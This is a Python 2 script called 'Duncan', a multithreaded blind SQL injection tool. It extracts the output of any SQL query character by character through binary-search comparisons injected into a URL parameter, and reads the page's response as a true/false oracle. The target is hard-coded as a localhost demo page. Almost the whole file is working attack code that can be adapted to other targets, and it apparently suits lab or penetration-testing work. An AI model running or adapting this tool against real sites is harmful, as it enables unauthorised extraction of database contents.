#!/usr/bin/env python

import threading
import requests
import argparse
import Queue

class Duncan(threading.Thread):
	def __init__(self,query='select version()',pos=1,q=None,charset=[],debug=0):
		"""Main constructor

		Keyword arguments:
        query -- Query to be executed
        pos -- Character position to test
        q -- Results Queue object
        charset -- List of the character codes to be tested
        """
		threading.Thread.__init__(self)
		self._query=query
		self._pos=pos
		self._charset=sorted(list(set(charset)))
		self._debug=debug

	def debug(self,level,msg):
		if level<=self._debug:
			print msg

	def run(self):
		while len(self._charset)>2:
			guess=self._charset[len(self._charset)/2]
			self.debug(5,"Max: %d Guess: %d Min: %d" % (self._charset[-1], guess, self._charset[0]))
			if self.decide(guess):
				self._charset=self._charset[0:len(self._charset)/2]
			else:
				self._charset=self._charset[len(self._charset)/2:]
		if self.decide(self._charset[-1]):
			self.debug(1,"Position %d: %c" % (self._pos,chr(self._charset[0])))
			q.put((self._pos,chr(self._charset[0])))
		else:
			self.debug(1,"Position %d: %c" % (self._pos,chr(self._charset[-1])))
			q.put((self._pos,chr(self._charset[-1])))


	def decide(self,guess):
		"""Here you should implement your injection code.

		Arguments:
		guess -- Guess

		Should return True if the actual ASCII value of a given position is less than guess
		""" 
		url="http://localhost/demo/sqli/blind.php?p=1 and ord(substr((%s),%d,1))<%d" % (self._query,self._pos,guess)
		self.debug(6,url)
		r=requests.get(url)
		
		if r.content.find(':)')>-1:
			return True
		else:
			return False

parser = argparse.ArgumentParser(description='Duncan - Blind SQL injector skeleton')
parser.add_argument("--query",required=True,help="The query to be run. Should contain only one attribute.")
parser.add_argument("--pos-start",default=1,type=int,help="First character position to look up")
parser.add_argument("--pos-end",default=5,type=int,help="Last character position to look up")
parser.add_argument("--ascii-start",default=32,type=int,help="Start of the ASCII range to test")
parser.add_argument("--ascii-end",default=123,type=int,help="End of the ASCII range to test")
parser.add_argument("--charset",help="Custom character set")
parser.add_argument("--debug",default=0,type=int,help="Debug - higher values for more verbosity")

args = parser.parse_args()
q=Queue.Queue()
threads=[]

charset=[]
if args.charset is not None:
	charset=[ord(c) for c in list(args.charset)]
else:
	charset=range(args.ascii_start,args.ascii_end+1)

for p in xrange(args.pos_start,args.pos_end):
	thread=Duncan(args.query,p,q,charset,args.debug)
	threads.append(thread)
	thread.start()

for t in threads:
	t.join()

l=[]
while not q.empty():
	l.append(q.get())

print ''.join([i[1] for i in sorted(list(l))])
